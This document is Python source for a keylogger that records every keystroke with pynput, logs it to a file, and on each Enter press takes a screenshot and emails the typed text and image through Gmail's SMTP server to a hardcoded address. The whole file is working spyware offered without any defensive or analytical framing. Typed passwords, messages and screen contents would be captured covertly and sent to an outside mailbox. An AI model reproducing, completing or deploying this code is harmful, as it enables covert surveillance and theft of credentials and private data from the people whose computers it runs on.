import pynput,os,smtplib,pyscreenshot
from pynput.keyboard import Key, Listener
from email.mime.multipart import  MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import multiprocessing
from multiprocessing import Process
import threading
my_email= "serhi1334@gmail.com"
password = YOUR-PASSWORD

#pyscreenshot.grab().save("/Users/Public/Photo.jpg")
count=0
keys=[]
text=[]
def on_press(key):
    global keys, count,text
    keys.append(key)
    count+=1
    print(key)
    if key== Key.enter:
        write_file(keys)
        take_screenshot()
        send_mail(text)
        count = 0
        text=[]
        keys=[]

def write_file(keys):
    global text
    with open('log.txt','a') as f:
        for key in keys:
            k=str(key).replace("'","")
            if k.find("backspace") >0:
                try:
                    text.pop()
                except IndexError:
                    pass
                delete_file(k)
            elif k.find("space")>0:
                text.append(' ')
                f.write(' ')
            elif k.find('enter')>0:
                text.append("\n")
                f.write('\n')
            elif k.find('Key') ==-1:
                text.append(k)
                f.write(k)
def delete_file(key):
    with open("log.txt", 'rb+') as filehandle:
        filehandle.seek(-1, os.SEEK_END)
        filehandle.truncate()
def take_screenshot():
    pyscreenshot.grab().save("Photo.jpg")

def send_mail(text):
    print(text)
    text = ''.join(text)
    print(text)
    message=MIMEMultipart()
    message['From'] = "Message"
    message['To'] = 'serhi1334@gmail.com'
    message['Subject'] = text
    image_open = open('Photo.jpg','rb')
    image_reading = image_open.read()
    adding_image = MIMEImage(image_reading,'jpg',name='Photo.jpg')
    message.attach(adding_image)

    image_open.close()
    #message_2 = f"Message\n\n {text}"
    with smtplib.SMTP("smtp.gmail.com") as connection:
        connection.starttls()
        connection.login(my_email, password=password)
        connection.sendmail(my_email, my_email, msg=f"{message.as_string()}")
def on_release(key):
    global text
    if key== Key.esc:
        print(text)
        return False

with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()

